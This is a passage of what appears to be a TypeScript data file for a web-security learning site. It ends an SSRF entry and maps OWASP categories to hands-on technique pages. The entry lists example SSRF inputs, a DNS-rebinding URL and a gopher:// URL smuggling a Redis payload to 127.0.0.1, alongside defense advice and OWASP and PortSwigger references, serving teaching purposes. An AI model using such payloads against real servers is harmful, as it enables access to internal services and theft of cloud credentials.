          { cmd: 'http://localhost.<YOUR-DOMAIN>/   (DNS record -> 127.0.0.1)', desc: 'DNS rebinding / attacker-controlled name resolving inward' },
          { cmd: 'gopher://127.0.0.1:6379/_<REDIS-PAYLOAD>', desc: 'Protocol smuggling: gopher:// to talk to Redis/SMTP internally' },
        ],
      },
    ],
    defense: 'Do not fetch user-supplied URLs; if you must, allowlist the destination host and scheme, resolve and validate the IP (block private and link-local ranges), disable redirects and unused protocols, and require the metadata service to use session tokens (IMDSv2).',
    refs: [
      { label: 'OWASP A10:2021', url: 'https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/' },
      { label: 'PortSwigger: SSRF', url: 'https://portswigger.net/web-security/ssrf' },
    ],
  },
];

/**
 * OWASP category -> the hands-on technique pages that implement it. Curated and
 * grounded (not fuzzy): only categories with a real technique in the corpus map,
 * so the theory hub and the hands-on pages link both ways. Categories without a
 * dedicated technique (crypto, insecure design, misconfig, logging)
 * simply have no hands-on row.
 */
export const OWASP_TECHNIQUES: Record<string, string[]> = {
  'broken-access-control': ['broken-access-control-idor'],
  'injection': ['sql-injection-sqli', 'cross-site-scripting-xss', 'command-injection', 'file-inclusion-lfi-rfi', 'server-side-template-injection-ssti', 'nosql-injection', 'xml-external-entity-xxe'],
  'vulnerable-components': ['cms-specific-attacks'],
  'auth-failures': ['authentication-bypass', 'jwt-attacks'],
  'integrity-failures': ['insecure-deserialization'],
  'ssrf': ['server-side-request-forgery-ssrf'],
};

/**
 * OWASP category -> hub-level cross-links beyond the hands-on techniques. Curated
 * and grounded: SSRF is exactly how cloud metadata credentials are stolen, so the
 * SSRF category and the Cloud domain point at each other.
 */
export const OWASP_SEEALSO: Record<string, { label: string; to: string }[]> = {
  'ssrf': [{ label: 'Cloud (metadata theft)', to: 'library/cloud' }],
};
